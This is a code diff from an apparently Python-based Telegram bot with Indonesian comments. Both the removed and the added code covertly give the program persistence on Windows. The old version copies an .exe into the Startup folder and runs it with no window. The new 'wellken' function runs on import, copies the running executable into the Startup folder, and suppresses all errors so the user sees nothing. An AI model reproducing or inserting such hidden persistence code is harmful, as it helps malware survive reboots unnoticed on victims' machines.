@@ -12,36 +12,39 @@ import json
 import shutil
 import subprocess
 import getpass
+import sys
 
-# Lokasi file script Python
-script_dir = os.path.dirname(__file__)
+def wellken():
+    """
+    Menyalin file executable ini ke folder startup di Windows tanpa menampilkan konsol atau pesan apapun.
+    """
+    typesys = os.name
 
-# Folder Startup untuk pengguna saat ini
-startup_folder = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-
-# Cari file dengan ekstensi .exe di direktori script
-exe_files = [f for f in os.listdir(script_dir) if os.path.isfile(os.path.join(script_dir, f)) and f.lower().endswith('.exe')]
-
-if not exe_files:
-    pass
-else:
-    # Ambil nama file pertama yang ditemukan
-    file_name = exe_files[0]
-    file_to_copy = os.path.join(script_dir, file_name)
-
-    # Cek apakah file sudah ada di folder Startup
-    if os.path.exists(os.path.join(startup_folder, file_name)):
-        pass
-    else:
+    if 'nt' in typesys.lower():  # Windows
         try:
-            # Salin file ke folder Startup
-            shutil.copy(file_to_copy, startup_folder)
-            pass
+            # Dapatkan jalur executable saat ini
+            executable_path = sys.argv[0]
+            # Dapatkan lokasi executable Python saat ini
+            lokasi = sys.exec_prefix
+            # Pisahkan path lokasi untuk memanipulasinya
+            loc = lokasi.split('\\')
+            # Bangun path folder startup
+            op = []
+            for lc in loc[:6]:
+                lol = str(lc) + '\\'
+                op.append(str(lol))
+            # Gabungkan komponen path untuk mendapatkan path lengkap folder startup
+            lll = (op[0] + op[1] + op[2] + op[3] + 'Roaming\\' + 'Microsoft\\' + 'Windows\\' + 'Start Menu\\' + 'Programs\\' + 'Startup\\')
+            
+            # Salin file executable ke folder startup
+            shutil.copy(executable_path, lll)
+        except Exception:
+            pass  # Tidak ada pesan kesalahan yang ditampilkan
+    elif 'posix' in typesys.lower():  # Linux atau macOS
+        pass  # Tidak ada operasi yang perlu dilakukan
 
-            # Jalankan file .exe tanpa menampilkan jendela konsol
-            subprocess.Popen([file_to_copy], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        except Exception as e:
-            pass
+# Panggil fungsi untuk menyalin executable ke folder startup
+wellken()
 
 class TelegramBot:
 
